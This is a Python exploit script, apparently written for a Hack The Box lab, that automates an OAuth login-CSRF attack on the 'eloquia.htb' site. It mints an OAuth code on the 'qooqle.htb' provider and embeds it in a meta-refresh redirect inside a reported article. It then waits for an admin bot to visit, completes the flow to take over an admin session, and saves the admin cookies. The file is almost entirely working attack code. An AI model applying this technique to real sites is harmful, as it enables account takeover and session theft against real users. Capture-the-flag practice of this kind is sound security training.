#!/usr/bin/env python3
"""
exploit_now.py - Combined exploit: create article + wait + login

Run this when capture_server.py yells "GO GO GO!"
It will:
1. Create poisoned article with fresh OAuth code
2. Wait for bot to visit (~15 seconds)
3. Attempt login as admin
"""

import requests
import os
import sys
import time
import random
import re
import subprocess
from PIL import Image
from io import BytesIO

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"

CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

# Timing
WAIT_FOR_BOT = 15  # seconds to wait for bot to visit

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner():
    img = Image.new('RGB', (200, 150))
    for i in range(200):
        for j in range(150):
            img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

def get_all_article_ids(session):
    my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
    return set(re.findall(r'article/visit/(\d+)', my_articles.text))

def main():
    username, password = load_credentials()
    if not username:
        print("[-] No credentials. Run ./01_register_users.py")
        sys.exit(1)

    print("=" * 60)
    print("  EXPLOIT NOW - Combined OAuth CSRF Attack")
    print("=" * 60)
    print(f"[*] Attacker: {username}")
    print()

    # === PHASE 1: Create exploit article ===
    print("[1/5] Logging into Qooqle...")
    qooqle_session = requests.Session()
    login_page = qooqle_session.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    qooqle_session.post(f"{TARGET_QOOQLE}/login/", data={
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password
    }, headers={'Referer': f"{TARGET_QOOQLE}/login/"})

    if 'sessionid' not in qooqle_session.cookies:
        print("[-] Qooqle login failed!")
        sys.exit(1)
    print("    OK")

    print("[2/5] Generating fresh OAuth code...")
    auth_url = f"{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}"
    auth_page = qooqle_session.get(auth_url)
    csrf = get_csrf(auth_page.text)

    resp = qooqle_session.post(auth_url, data={
        'csrfmiddlewaretoken': csrf,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write',
        'client_id': CLIENT_ID,
        'response_type': 'code',
        'allow': 'Authorize'
    }, headers={'Referer': auth_url}, allow_redirects=False)

    location = resp.headers.get('Location', '')
    code_match = re.search(r'code=([^&\s]+)', location)
    if not code_match:
        print("[-] Failed to get OAuth code")
        sys.exit(1)

    oauth_code = code_match.group(1)
    print(f"    Code: {oauth_code[:16]}...")

    malicious_url = f"{REDIRECT_URI}?code={oauth_code}"

    print("[3/5] Creating poisoned article...")
    eloquia_session = requests.Session()
    login_page = eloquia_session.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    eloquia_session.post(f"{TARGET_ELOQUIA}/accounts/login/", data={
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password
    }, headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"})

    if 'sessionid' not in eloquia_session.cookies:
        print("[-] Eloquia login failed!")
        sys.exit(1)

    existing_ids = get_all_article_ids(eloquia_session)
    create_page = eloquia_session.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = get_csrf(create_page.text)

    timestamp = str(int(time.time()))
    content = f'<meta http-equiv="refresh" content="0;url={malicious_url}"><p>Security update.</p>'

    resp = eloquia_session.post(f"{TARGET_ELOQUIA}/article/create/",
        data={
            'csrfmiddlewaretoken': csrf,
            'title': f"Update {timestamp}",
            'content': content
        },
        files={'banner': ('banner.png', create_banner(), 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)
    if not article_id:
        new_ids = get_all_article_ids(eloquia_session)
        created_ids = new_ids - existing_ids
        if created_ids:
            article_id = max(created_ids)

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    print(f"    Article ID: {article_id}")

    print("[4/5] Reporting article & waiting for bot...")
    eloquia_session.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")

    # Countdown
    for i in range(WAIT_FOR_BOT, 0, -1):
        print(f"\r    Waiting: {i}s  ", end='', flush=True)
        time.sleep(1)
    print("\r    Waiting: done!    ")

    # === PHASE 2: Login as admin ===
    print("[5/5] Attempting login as admin...")

    # Fresh OAuth flow from Eloquia using our Qooqle session
    eloquia_login = requests.Session()
    oauth_init = eloquia_login.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/", allow_redirects=False)
    qooqle_auth_url = oauth_init.headers.get('Location', '')

    if 'qooqle' not in qooqle_auth_url:
        print("[-] Unexpected OAuth redirect")
        sys.exit(1)

    auth_page = qooqle_session.get(qooqle_auth_url)
    csrf = get_csrf(auth_page.text)
    if not csrf:
        print("[-] Could not get CSRF from auth page")
        sys.exit(1)

    resp = qooqle_session.post(qooqle_auth_url, data={
        'csrfmiddlewaretoken': csrf,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write',
        'client_id': CLIENT_ID,
        'response_type': 'code',
        'allow': 'Authorize'
    }, headers={'Referer': qooqle_auth_url}, allow_redirects=False)

    callback_url = resp.headers.get('Location', '')
    resp = eloquia_login.get(callback_url, allow_redirects=True)

    if 'sessionid' in eloquia_login.cookies:
        print()
        print("*" * 60)
        print("  SUCCESS! Got Eloquia session!")
        print("*" * 60)

        # Check who we are
        profile = eloquia_login.get(f"{TARGET_ELOQUIA}/accounts/profile/")
        username_match = re.search(r'value="([^"]+)"[^>]*id="id_username"', profile.text)
        if not username_match:
            username_match = re.search(r'Howdy,\s*(\w+)', profile.text)

        if username_match:
            logged_in_as = username_match.group(1)
            print(f"  Logged in as: {logged_in_as}")

            if 'admin' in logged_in_as.lower():
                print()
                print("  !!! ADMIN ACCESS CONFIRMED !!!")

                # Save cookies
                with open(os.path.join(TMP_DIR, "admin_cookies.txt"), "w") as f:
                    for cookie in eloquia_login.cookies:
                        f.write(f"{cookie.name}={cookie.value}\n")
                print(f"  Cookies saved to: {TMP_DIR}/admin_cookies.txt")

                # Check for flag
                if 'HTB{' in profile.text:
                    flag = re.search(r'HTB\{[^}]+\}', profile.text)
                    if flag:
                        print(f"\n  FLAG: {flag.group(0)}")

                # Check admin panel
                admin_check = eloquia_login.get(f"{TARGET_ELOQUIA}/admin/")
                if admin_check.status_code == 200:
                    print("  Admin panel accessible at /admin/")
        else:
            print("  Could not determine username - check manually")
        print("*" * 60)
    else:
        print()
        print("[-] No session obtained")
        print("    The OAuth code may have expired before bot visited.")
        print("    Try again - run test first to calibrate timing.")

if __name__ == "__main__":
    main()
